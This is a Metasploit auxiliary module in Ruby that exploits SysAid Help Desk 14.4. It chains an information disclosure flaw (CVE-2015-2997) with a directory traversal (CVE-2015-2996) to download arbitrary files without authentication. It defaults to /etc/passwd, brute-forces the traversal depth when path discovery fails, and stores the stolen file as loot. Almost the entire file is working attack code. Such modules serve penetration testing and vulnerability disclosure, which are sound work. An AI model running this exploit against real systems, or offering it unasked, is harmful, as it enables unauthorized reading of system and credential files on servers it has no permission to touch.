##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'SysAid Help Desk Arbitrary File Download',
      'Description' => %q{
        This module exploits two vulnerabilities in SysAid Help Desk that allows
        an unauthenticated user to download arbitrary files from the system. First, an
        information disclosure vulnerability (CVE-2015-2997) is used to obtain the file
        system path, and then we abuse a directory traversal (CVE-2015-2996) to download
        the file. Note that there are some limitations on Windows, in that the information
        disclosure vulnerability doesn't work on a Windows platform, and we can only
        traverse the current drive (if you enter C:\afile.txt and the server is running
        on D:\ the file will not be downloaded).

        This module has been tested with SysAid 14.4 on Windows and Linux.
        },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2015-2996'],
          ['CVE', '2015-2997'],
          ['URL', 'https://seclists.org/fulldisclosure/2015/Jun/8'],
          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt'],
        ],
      'DisclosureDate' => 'Jun 3 2015'))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8080]),
        OptString.new('TARGETURI', [ true,  "SysAid path", '/sysaid']),
        OptString.new('FILEPATH', [false, 'Path of the file to download (escape Windows paths with a back slash)', '/etc/passwd']),
      ])
  end

  def get_traversal_path
    print_status("Trying to find out the traversal path...")
    large_traversal = '../' * rand(15...30)
    servlet_path = 'getAgentLogFile'

    # We abuse getAgentLogFile to obtain the
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], servlet_path),
      'method' => 'POST',
      'data' => Zlib::Deflate.deflate(Rex::Text.rand_text_alphanumeric(rand(100) + rand(300))),
      'ctype' => 'application/octet-stream',
      'vars_get' => {
        'accountId' => large_traversal + Rex::Text.rand_text_alphanumeric(8 + rand(10)),
        'computerId' => Rex::Text.rand_text_alphanumeric(8 + rand(10))
      }
    })

    if res && res.code == 200 && res.body.to_s =~ /\<H2\>(.*)\<\/H2\>/
      error_path = $1
      # Error_path is something like:
      # /var/lib/tomcat7/webapps/sysaid/./WEB-INF/agentLogs/../../../../../../../../../../ajkdnjhdfn/1421678611732.zip
      # This calculates how much traversal we need to do to get to the root.
      position = error_path.index(large_traversal)
      unless position.nil?
        return '../' * (error_path[0, position].count('/') - 2)
      end
    end
  end

  def download_file(download_path)
    begin
      return send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'getGfiUpgradeFile'),
        'vars_get' => {
          'fileName' => download_path
        },
      })
    rescue Rex::ConnectionRefused
      print_error("Could not connect.")
      return
    end
  end

  def run
    # No point to continue if filepath is not specified
    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
      fail_with(Failure::BadConfig, 'Please supply the path of the file you want to download.')
    end

    print_status("Downloading file #{datastore['FILEPATH']}")
    if datastore['FILEPATH'] =~ /([A-Za-z]{1}):(\\*)(.*)/
      file_path = $3
    else
      file_path = datastore['FILEPATH']
    end

    traversal_path = get_traversal_path
    if traversal_path.nil?
      print_error("Could not get traversal path, using bruteforce to download the file")
      count = 1
      while count < 15
        res = download_file(('../' * count) + file_path)
        if res && res.code == 200  && res.body.to_s.bytesize != 0
          break
        end
        count += 1
      end
    else
      res = download_file(traversal_path[0,traversal_path.length - 1] + file_path)
    end

    if res && res.code == 200
      if res.body.to_s.bytesize == 0
        fail_with(Failure::NoAccess, "#{peer} - 0 bytes returned, file does not exist or it is empty.")
      else
        vprint_line(res.body.to_s)
        fname = File.basename(datastore['FILEPATH'])

        path = store_loot(
          'sysaid.http',
          'application/octet-stream',
          datastore['RHOST'],
          res.body,
          fname
        )
        print_good("File saved in: #{path}")
      end
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to download file.")
    end
  end
end
